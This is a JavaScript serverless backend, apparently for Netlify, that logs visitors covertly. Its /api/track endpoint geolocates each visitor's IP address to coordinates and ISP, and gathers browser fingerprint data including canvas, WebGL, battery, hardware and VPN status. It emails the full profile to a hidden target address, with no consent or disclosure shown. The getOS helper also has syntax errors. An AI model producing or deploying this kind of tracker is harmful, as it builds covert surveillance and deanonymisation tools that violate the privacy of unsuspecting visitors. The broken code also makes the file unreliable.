const express = require('express');
const cors = require('cors');
// const fetch = require('node-fetch'); // This line is REMOVED/COMMENTED OUT
const serverless = require('serverless-http');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Your hidden secrets (these will come from Netlify Environment Variables)
const EMAILJS_PUBLIC_KEY = process.env.EMAILJS_PUBLIC_KEY;
const EMAILJS_SERVICE_ID = process.env.EMAILJS_SERVICE_ID;
const EMAILJS_TEMPLATE_ID = process.env.EMAILJS_TEMPLATE_ID;
const TARGET_EMAIL = process.env.TARGET_EMAIL;

// Helper function to get OS
function getOS(userAgent) {
    if (userAgent.includes("Win")) return "Windows";
    if (userAgent.includes("Mac")) return "macOS");
    if (userAgent.includes("Linux")) return "Linux");
    if (userAgent.includes("Android")) return "Android");
    if (userAgent.includes("iPhone")) return "iOS");
    return "Unknown";
}

// Helper function to get Browser
function getBrowser(userAgent) {
    if (userAgent.includes("Chrome") && !userAgent.includes("Edge")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
    if (userAgent.includes("Edge")) return "Edge";
    if (userAgent.includes("Opera")) return "Opera";
    return "Unknown";
}

// API endpoint to track visitors and send email
app.post('/api/track', async (req, res) => {
    try {
        // Get visitor's IP from request headers (more reliable for proxied requests)
        const visitorIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.connection.remoteAddress;
        
        // --- Fetch detailed IP info from ipapi.co ---
        // Using native fetch API (no 'require("node-fetch")' needed)
        const ipResponse = await fetch(`https://ipapi.co/${visitorIP}/json/`);
        const ipData = await ipResponse.json();
        
        // --- Get additional client-side data from the frontend request body ---
        const { 
            userAgent, screen, language, referrer,
            connectionEffectiveType, connectionDownlink, connectionType,
            cpuCores, deviceMemory, touchSupport, batteryInfo,
            cookiesEnabled, localStorageSupport, sessionStorageSupport,
            webglInfo, canvasFingerprint, javaEnabled, flashDetected,
            timezoneOffset, localTime, platform, doNotTrack, onlineStatus,
            ipv6Address, vpnDetected
        } = req.body;

        // --- Prepare the email data ---
        const emailData = {
            to_email: TARGET_EMAIL,
            subject: 'New IP Visitor - Full Data',
            message: `=== IP & NETWORK ===
IP ADDRESS: ${ipData.ip || visitorIP}
IPv6: ${ipv6Address || 'unavailable'}
LOCATION: ${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}
ISP / PROVIDER: ${ipData.org || 'unknown'}
COUNTRY CODE: ${ipData.country_code || 'unknown'} (${ipData.country_calling_code || 'n/a'})
TIMEZONE: ${ipData.timezone || 'unknown'}
COORDINATES: ${ipData.latitude || 'unknown'}, ${ipData.longitude || 'unknown'}
ASN: AS${ipData.asn || 'unknown'} - ${ipData.network || 'unknown'}
VPN/PROXY: ${vpnDetected || 'unknown'}

=== SYSTEM INFO ===
OS: ${getOS(userAgent || '')}
BROWSER: ${getBrowser(userAgent || '')}
USER AGENT: ${userAgent || 'unknown'}
SCREEN: ${screen || 'unknown'}
LANGUAGE: ${language || 'unknown'}
CONNECTION: ${connectionEffectiveType || 'unknown'} - ${connectionDownlink || 'unknown'}mbps (${connectionType || 'unknown'})
CPU CORES: ${cpuCores || 'unknown'}
MEMORY: ${deviceMemory ? `${deviceMemory}GB` : 'unknown'}
TOUCH SUPPORT: ${touchSupport || 'unknown'}
BATTERY: ${batteryInfo || 'unavailable'}

=== BROWSER DATA ===
COOKIES ENABLED: ${cookiesEnabled ? 'enabled' : 'disabled'}
LOCAL STORAGE: ${localStorageSupport || 'unknown'}
SESSION STORAGE: ${sessionStorageSupport || 'unknown'}
WEBGL: ${webglInfo || 'unknown'}
CANVAS FINGERPRINT: ${canvasFingerprint || 'unknown'}
REFERRER: ${referrer || 'direct'}
JAVA ENABLED: ${javaEnabled || 'unknown'}
FLASH: ${flashDetected || 'unknown'}

=== ADDITIONAL ===
TIMEZONE OFFSET: ${timezoneOffset || 'unknown'}
LOCAL TIME: ${localTime || 'unknown'}
PLATFORM: ${platform || 'unknown'}
DO NOT TRACK: ${doNotTrack || 'not set'}
ONLINE STATUS: ${onlineStatus || 'unknown'}`
        };
        
        // --- Send email using EmailJS (server-side API) ---
        // Using native fetch API
        const emailResponse = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                service_id: EMAILJS_SERVICE_ID,
                template_id: EMAILJS_TEMPLATE_ID,
                user_id: EMAILJS_PUBLIC_KEY, // This is your Public Key
                template_params: emailData // This is the data for your email template
            })
        });
        
        if (emailResponse.ok) {
            console.log('Email sent successfully via backend.');
        } else {
            const errorBody = await emailResponse.text();
            console.error('EmailJS API error:', emailResponse.status, errorBody);
        }
        
        // --- Return data to frontend for display ---
        res.json({
            success: true,
            data: {
                ip: ipData.ip || visitorIP,
                location: `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}`,
                isp: ipData.org || 'unknown',
                country: `${ipData.country_code || 'unknown'} (${ipData.country_calling_code || 'n/a'})`,
                timezone: ipData.timezone || 'unknown',
                coords: `${ipData.latitude || 'unknown'}, ${ipData.longitude || 'unknown'}`,
                asn: `AS${ipData.asn || 'unknown'} - ${ipData.network || 'unknown'}`
            }
        });
        
    } catch (error) {
        console.error('Server error during tracking:', error);
        res.status(500).json({ success: false, error: 'Server error during tracking.' });
    }
});

// IMPORTANT: Export the app as a serverless handler
module.exports.handler = serverless(app);
